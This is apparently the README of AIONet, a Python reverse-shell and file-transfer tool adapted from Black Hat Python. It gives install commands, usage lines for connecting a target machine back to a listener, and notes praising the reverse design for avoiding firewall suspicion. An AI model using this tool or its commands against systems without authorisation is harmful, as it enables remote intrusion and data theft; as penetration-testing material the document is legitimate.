# All-In-One Network Utility
AIONet was built as a multipurpose tool to replace netcat. Written in Python3, AIONet offers features like reverse shell spawning, file upload and file download.  
The idea for this tool was obtained from chapter 2 of Black Hat Python by Justin Seitz. This program aims to update BHP's tool to provide features like class-based structure, Python3 support and error checking. A detailed explanation of the differences between the two can be found at the end of this document.

## Dependencies
* Python 3 (>=3.6)

## Download
### Option 1: Using `git clone`
```
git clone https://github.com/aarole/aionet.git
cd aionet/
```

### Option 2: Using `wget`
```
wget -O aionet.py https://raw.githubusercontent.com/aarole/aionet/master/aionet.py
```

### Option 3: Using `pip`
```
python3 -m pip install --upgrade aionet
```

### Option 4: Using Docker
#### Getting the image
##### 4.1.1: Using Docker Hub
```
docker pull e1ora/aionet
```

##### 4.1.2: Building the image using the repository's Dockerfile
```
git clone https://github.com/aarole/aionet.git
cd aionet/
docker build -t e1ora/aionet .
```

#### 4.2: Running the container
```
docker run --rm -it -v /path/to/some/directory:/opt -p PORT:PORT aionet -l -p PORT
```
* /path/to/some/directory
  * Directory (a) containing the files you may want to upload, or (b) to which you may want to download files
  * Directory path should be on your Docker host
* PORT
  * Port on which the listener will listen
  * Use the same port in all three locations

## Usage
```
On host:           python3 aionet.py -p PORT -l
On remote machine: python3 aionet.py -t TARGET -p PORT

Options:
-t target, --target target IP address of the remote listener
-p port, --port port       If used with -l, port where listener is to be created; else, port where remote listener exists
-l, --listen               Create a listener on the port defined using -p
-h, --help                 show this help message and exit
```

## Updates
* Program structure overhauled to allow for easy extension
  * Created individual classes for the server (listener/host) and the client (target/remote machine)
* Updated program to use reverse backdoors
  * Listener is created on the physical machine and remote target connects to it
  * Opening a port on the host ensures that firewalls on the remote target do not raise red flags
* Replaced getopt with argparse
* Moved file manipulation (download and upload) to post-shell operations
  * Used the base64 library to encode files during upload/download
  * Base64 encoding allows for easy transfer of files (especially non-text [pdf, png, jpg] files)
* Used the os library to allow for usage of cd and rm commands
* Added error-checking during file upload/download using SHA256 hashes (provided by hashlib)
  * Hash is sent from the source computer along with the message
  * The destination hashes the file locally
  * If the hashes match, the file is downloaded/uploaded; else, the file is deleted

## TODO
* Implement logging

## Known issues
* File download
  * ~~Non-text files (png, jpg, pdf) cause errors when downloading them~~
  * ~~Files are partially downloaded and a part of the base64 encoded file is printed~~
  * Fix: Switched from length-based recv to sentinel-based recv
* Exit condition
  * ~~exit command is not handled properly on the server~~
  * Fix: Moved handle() call in Server class to outside the while loop
